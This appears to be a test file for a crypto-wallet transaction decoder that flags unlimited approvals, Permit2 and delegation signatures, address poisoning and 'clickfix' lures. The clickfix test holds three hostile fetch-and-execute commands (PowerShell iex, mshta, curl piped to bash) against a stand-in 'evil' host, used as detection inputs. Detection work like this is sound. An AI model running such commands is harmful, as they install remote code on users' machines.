import { describe, it, expect } from "vitest";
import { decodeCalldata, decodeTx, decodeTypedData, decodeSendCalls, looksPoisoned, CLICKFIX_RE, CRYPTO_ADDR_RE } from "../src/lib/txdecode";

const SPENDER = "00000000000000000000000011112222333344445555666677778888999900aa";
const MAX = "f".repeat(64);

describe("calldata decoding", () => {
  it("unlimited approve", () => {
    const i = decodeCalldata("0x095ea7b3" + SPENDER + MAX, "0xToken");
    expect(i.kind).toBe("approve-unlimited");
    expect(i.counterparty).toBe("0x11112222333344445555666677778888999900aa");
    expect(i.unlimited).toBe(true);
  });
  it("bounded approve", () => {
    const i = decodeCalldata("0x095ea7b3" + SPENDER + "0".repeat(60) + "03e8");
    expect(i.kind).toBe("approve");
    expect(i.unlimited).toBe(false);
  });
  it("setApprovalForAll true / false", () => {
    expect(decodeCalldata("0xa22cb465" + SPENDER + "0".repeat(63) + "1").kind).toBe("setApprovalForAll");
    expect(decodeCalldata("0xa22cb465" + SPENDER + "0".repeat(64)).kind).toBe("none");
  });
  it("transfer and transferFrom", () => {
    expect(decodeCalldata("0xa9059cbb" + SPENDER + "0".repeat(64)).kind).toBe("transfer");
    expect(decodeCalldata("0x23b872dd" + "0".repeat(64) + SPENDER + "0".repeat(64)).counterparty).toBe("0x11112222333344445555666677778888999900aa");
  });
  it("multicall wrapping an unlimited approve", () => {
    const inner = "095ea7b3" + SPENDER + MAX;
    const i = decodeCalldata("0xac9650d8" + "0".repeat(64) + inner);
    expect(i.kind).toBe("multicall");
    expect(i.inner?.some((x) => x.kind === "approve-unlimited")).toBe(true);
  });
  it("Permit2.approve", () => {
    const i = decodeCalldata("0x87517c45" + "0".repeat(24) + "a".repeat(40) + SPENDER + MAX + "0".repeat(64));
    expect(i.kind).toBe("permit2");
    expect(i.unlimited).toBe(true);
  });
});

describe("transaction decoding", () => {
  it("EIP-7702 delegation", () => {
    expect(decodeTx({ to: "0x1", authorizationList: [{ address: "0xABC" }] }).kind).toBe("delegation-7702");
    expect(decodeTx({ to: "0x1", type: "0x4" }).kind).toBe("delegation-7702");
  });
  it("plain ETH send and payable unknown", () => {
    expect(decodeTx({ to: "0x1", value: "0x5af3107a4000" }).kind).toBe("eth-send");
    expect(decodeTx({ to: "0x1", value: "0x5af3107a4000", data: "0xdeadbeef" + "0".repeat(64) }).kind).toBe("unknown-payable");
    expect(decodeTx({ to: "0x1", value: "0x0", data: "0x" }).kind).toBe("none");
  });
  it("wallet_sendCalls batch", () => {
    const i = decodeSendCalls({ calls: [{ to: "0xT", data: "0x095ea7b3" + SPENDER + MAX }, { to: "0xT2", data: "0xa22cb465" + SPENDER + "0".repeat(63) + "1" }] });
    expect(i.inner?.map((x) => x.kind)).toEqual(["approve-unlimited", "setApprovalForAll"]);
  });
});

describe("typed data decoding", () => {
  it("Permit2 PermitSingle with spender", () => {
    const td = { primaryType: "PermitSingle", message: { details: { token: "0x1", amount: "1" }, spender: "0x11112222333344445555666677778888999900aa", sigDeadline: "999" } };
    const s = decodeTypedData(JSON.stringify(td));
    expect(s.kind).toBe("permit2");
    expect(s.counterparty).toBe("0x11112222333344445555666677778888999900aa");
  });
  it("PermitBatchWitnessTransferFrom, PermitForAll, Seaport, Blur, Delegation", () => {
    expect(decodeTypedData({ primaryType: "PermitBatchWitnessTransferFrom", message: {} }).kind).toBe("permit-batch");
    expect(decodeTypedData({ primaryType: "PermitForAll", message: { operator: "0x" + "b".repeat(40) } }).counterparty).toBe("0x" + "b".repeat(40));
    expect(decodeTypedData({ primaryType: "OrderComponents", message: {} }).kind).toBe("seaport-order");
    expect(decodeTypedData({ primaryType: "Root", domain: { name: "Blur Exchange" }, message: {} }).kind).toBe("blur-order");
    expect(decodeTypedData({ primaryType: "Delegation", message: { delegate: "0x" + "c".repeat(40) } }).kind).toBe("delegation");
    expect(decodeTypedData({ primaryType: "Mail", message: {} }).kind).toBe("other");
  });
});

describe("address poisoning and clickfix", () => {
  it("flags a look-alike recipient", () => {
    const known = ["0xabcd000000000000000000000000000000001234"];
    expect(looksPoisoned("0xabcd999999999999999999999999999999991234", known)).toBe(known[0]);
    expect(looksPoisoned(known[0], known)).toBeUndefined();
    expect(looksPoisoned("0x1111000000000000000000000000000000002222", known)).toBeUndefined();
  });
  it("clickfix patterns", () => {
    expect(CLICKFIX_RE.test("powershell -w hidden -c iex(iwr http://x)")).toBe(true);
    expect(CLICKFIX_RE.test("mshta https://evil/x.hta")).toBe(true);
    expect(CLICKFIX_RE.test("curl -fsSL https://evil/x | bash")).toBe(true);
    expect(CLICKFIX_RE.test("npm install ethers")).toBe(false);
  });
  it("address regex", () => {
    expect(CRYPTO_ADDR_RE.test("send to 0x" + "a".repeat(40))).toBe(true);
    expect(CRYPTO_ADDR_RE.test("hello world")).toBe(false);
  });
});
